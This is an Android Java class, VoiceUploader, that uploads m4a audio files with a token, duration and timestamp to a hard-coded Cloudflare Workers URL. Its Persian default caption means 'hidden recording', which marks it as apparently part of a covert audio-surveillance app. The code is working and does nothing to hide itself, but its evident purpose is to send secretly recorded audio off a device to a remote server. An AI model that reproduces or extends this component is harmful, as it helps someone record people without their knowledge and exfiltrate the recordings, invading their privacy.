package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class VoiceUploader {
    private static final String TAG = "VoiceUploader";
    private static final String WORKER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/voice-event";
    
    private OkHttpClient httpClient;
    
    public VoiceUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    public interface UploadCallback {
        void onSuccess(String response);
        void onFailure(String error);
    }
    
    public void uploadVoice(String filePath, String voiceToken, String caption, long duration, UploadCallback callback) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) {
                    callback.onFailure("فایل صوتی پیدا نشد");
                    return;
                }
                
                Log.d(TAG, "📤 Uploading to Worker: " + filePath);
                Log.d(TAG, "📏 Size: " + file.length() + " bytes");
                
                // ساخت FormData
                RequestBody fileBody = RequestBody.create(
                    file,
                    MediaType.parse("audio/m4a")
                );
                
                MultipartBody.Builder builder = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("audio", file.getName(), fileBody)
                    .addFormDataPart("voice_token", voiceToken)
                    .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                    .addFormDataPart("duration", String.valueOf(duration / 1000))
                    .addFormDataPart("start_time", String.valueOf(System.currentTimeMillis()));
                
                RequestBody requestBody = builder.build();
                
                Request request = new Request.Builder()
                    .url(WORKER_URL)
                    .post(requestBody)
                    .build();
                
                Response response = httpClient.newCall(request).execute();
                String responseBody = response.body() != null ? response.body().string() : "";
                
                Log.d(TAG, "📥 Response Code: " + response.code());
                Log.d(TAG, "📥 Response: " + responseBody);
                
                if (response.isSuccessful()) {
                    try {
                        JSONObject json = new JSONObject(responseBody);
                        String status = json.optString("status", "unknown");
                        if ("success".equals(status)) {
                            callback.onSuccess(responseBody);
                        } else {
                            String msg = json.optString("message", "خطا در سرور");
                            callback.onFailure(msg);
                        }
                    } catch (Exception e) {
                        callback.onFailure("خطا در پردازش پاسخ سرور");
                    }
                } else {
                    callback.onFailure("خطا در ارتباط با سرور: " + response.code());
                }
                
                response.close();
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Upload error", e);
                callback.onFailure(e.getMessage());
            }
        }).start();
    }
    
    // متد ساده برای آپلود بدون کالبک (همگام)
    public boolean uploadVoiceSync(String filePath, String voiceToken, String caption, long duration) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return false;
            
            RequestBody fileBody = RequestBody.create(
                file,
                MediaType.parse("audio/m4a")
            );
            
            MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("audio", file.getName(), fileBody)
                .addFormDataPart("voice_token", voiceToken)
                .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                .addFormDataPart("duration", String.valueOf(duration / 1000));
            
            RequestBody requestBody = builder.build();
            
            Request request = new Request.Builder()
                .url(WORKER_URL)
                .post(requestBody)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Upload error", e);
            return false;
        }
    }
}
